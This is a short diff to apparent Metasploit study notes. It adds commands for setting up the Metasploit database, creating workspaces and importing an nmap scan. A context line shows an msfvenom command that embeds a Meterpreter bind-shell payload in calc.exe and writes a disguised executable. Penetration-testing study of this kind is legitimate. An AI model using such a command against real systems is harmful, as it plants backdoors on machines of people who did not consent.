@@ -73,3 +73,10 @@ Example 4: To generate a payload with a specific encoder, and then encode 3 time
 Example 5: Inject a payload to calc.exe, and save it as new.exe
 
 ./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > new.exe  
+
+#Work with Metasploit DB
+root@kali:~# systemctl start postgresql
+root@kali:~# msfdb init
+msf > db_status 
+msf > workspace -a lab4 / msf > workspace -d lab4
+msf >  db_import /root/msfu/nmapScan 
